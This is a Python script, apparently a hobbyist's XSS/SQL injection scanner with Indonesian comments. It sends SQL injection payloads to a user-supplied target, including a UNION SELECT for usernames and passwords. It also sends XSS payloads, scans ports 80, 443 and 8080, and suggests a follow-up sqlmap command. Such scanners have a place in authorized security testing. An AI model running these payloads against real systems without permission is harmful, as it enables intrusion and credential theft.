import asyncio
import httpx
from lxml import html
import warnings
import socket
import sys
import os
from colorama import init, Fore, Style
import requests
import pyfiglet

def installation():
    print("instalation library")
    os.system("pip install httpx lxml")
    os.system("pip install request colorama")
    os.system("pip install pyfiglet")

os.system("clear")
pilihan = input("Install Library y/n: ")
if pilihan == "y":
    installation()
os.system("clear")
def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except:
        return "Tidak dapat mengambil IP publik."
ip = get_public_ip()

os.system("clear")
def WM():
    os.system("clear")
    init(autoreset=True)
    print(Fore.MAGENTA+'''
                                                                                     ,--,               
                                                                                  ,---.'|               
  ,----..     ,---,                            ___      .--.--.       ,----..     |   | :,--,     ,--,  
 /   /   \  ,--.' |                          ,--.'|_   /  /    '.    /   /   \    :   : ||'. \   / .`|  
|   :     : |  |  :       ,---.              |  | :,' |  :  /`. /   /   .     :   |   ' :; \ `\ /' / ;  
.   |  ;. / :  :  :      '   ,'\   .--.--.   :  : ' : ;  |  |--`   .   /   ;.  \  ;   ; '`. \  /  / .'  
.   ; /--`  :  |  |,--. /   /   | /  /    '.;__,'  /  |  :  ;_    .   ;   /  ` ;  '   | |_\  \/  / ./   
;   | ;  __ |  :  '   |.   ; ,. :|  :  /`./|  |   |    \  \    `. ;   |  ; \ ; |  |   | :.'\  \.'  /    
|   : |.' .'|  |   /' :'   | |: :|  :  ;_  :__,'| :     `----.   \|   :  | ; | '  '   :    ;\  ;  ;     
.   | '_.' :'  :  | | |'   | .; : \  \    `. '  : |__   __ \  \  |.   |  ' ' ' :  |   |  .// \  \  \    
'   ; : \  ||  |  ' | :|   :    |  `----.   \|  | '.'| /  /`--'  /'   ;  \; /  |  ;   : ; ;  /\  \  \   
'   | '/  .'|  :  :_:,' \   \  /  /  /`--'  /;  :    ;'--'.     /  \   \  ',  . \ |   ,/./__;  \  ;  \  
|   :    /  |  | ,'      `----'  '--'.     / |  ,   /   `--'---'    ;   :      ; |'---' |   : / \  \  ; 
 \   \ .'   `--''                  `--'---'   ---`-'                 \   \ .'`--"       ;   |/   \  ' | 
  `---`                                                               `---`             `---'     `--`  
                                                                                                        
'''+Style.RESET_ALL)

def WM2():
    print("╔═════════════════════════════════════════╗")
    print("║Author    :\t Xvenn-03                 ║")
    print("║Github    :\t github.com/Xvenn-03      ║")
    print(f"║ip public :\t {ip}            ║")
    print("║This tool :\t Check Vuln XSS & SQL     ║")
    print("╚═════════════════════════════════════════╝")
    
WM()
WM2()
# Nonaktifkan peringatan SSL (hati-hati dalam produksi!)
warnings.filterwarnings("ignore")

# Konfigurasi
TARGET_URL = input("\nInput target : ")  # Contoh target (ganti dengan URL target)
TIMEOUT = 5.0
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Payloads untuk SQLi & XSS
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT null,username,password FROM users --",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>"
]

async def check_sql_injection(url, client):
    """Deteksi SQL Injection dengan payload berbeda."""
    vuln_found = False
    for payload in SQLI_PAYLOADS:
        try:
            target_url = f"{url}?id={payload}" if "?" not in url else f"{url}{payload}"
            response = await client.get(target_url, timeout=TIMEOUT)
            
            # Deteksi error-based SQLi
            error_keywords = ["SQL syntax", "MySQL error", "unclosed quotation mark"]
            if any(keyword in response.text.lower() for keyword in error_keywords):
                print(f"[!] SQL Injection Vuln (Error-Based) found: {target_url}")
                vuln_found = True
            
            # Deteksi UNION-based SQLi
            if "username" in response.text and "password" in response.text:
                print(f"[!] SQL Injection Vuln (Union-Based) found: {target_url}")
                vuln_found = True
                
        except Exception as e:
            print(f"[X] Error checking SQLi: {e}")
    
    return vuln_found

async def check_xss(url, client):
    """Deteksi XSS dengan payload berbeda."""
    vuln_found = False
    for payload in XSS_PAYLOADS:
        try:
            target_url = f"{url}?search={payload}" if "?" not in url else f"{url}{payload}"
            response = await client.get(target_url, timeout=TIMEOUT)
            
            # Deteksi apakah payload dirender di HTML
            if payload in response.text:
                print(f"[!] Possible XSS Vuln found: {target_url}")
                vuln_found = True
                
        except Exception as e:
            print(f"[X] Error checking XSS: {e}")
    
    return vuln_found

def scan_ports(target_host):
    """Scan port sederhana """
    ports = [80, 443, 8080]
    print(f"\n[+] Scanning ports on {target_host}...")
    
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target_host, port))
                if result == 0:
                    print(f"[+] Port {port} is "+Fore.GREEN+"OPEN")
                else:
                    print(f"[+] Port {port} is "+Fore.RED+"CLOSED")
        except Exception as e:
            print(f"[X] Error scanning port {port}: {e}")

async def main():
    print(f"[+] Starting scan on: {TARGET_URL}")
    
    # Gunakan HTTPX untuk async requests
    async with httpx.AsyncClient(headers={"User-Agent": USER_AGENT}) as client:
        # Cek SQL Injection
        print("\n[+] Checking "+Fore.RED+"SQL Injection..."+Style.RESET_ALL)
        sql_vuln = await check_sql_injection(TARGET_URL, client)
        
        # Cek XSS
        print("\n[+] Checking "+Fore.RED+"XSS..."+Style.RESET_ALL)
        xss_vuln = await check_xss(TARGET_URL, client)
        
        # Integrasi SQLMap (opsional, butuh sqlmap API)
        if sql_vuln:
            print("\n[!] SQL Injection vulnerabilities found!")
            print("Consider running SQLMap manually with:")
            print(f"sqlmap -u {TARGET_URL} --batch")
        
        # Scan port dengan socket (pengganti Scapy)
        target_host = TARGET_URL.split("//")[-1].split("/")[0]
        # Jalankan scan port dalam thread terpisah karena blocking
        await asyncio.to_thread(scan_ports, target_host)
        
        print(Fore.GREEN+"\n[+] Scan completed!")

if __name__ == "__main__":
    # Handle keyboard interrupt lebih baik
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(0)
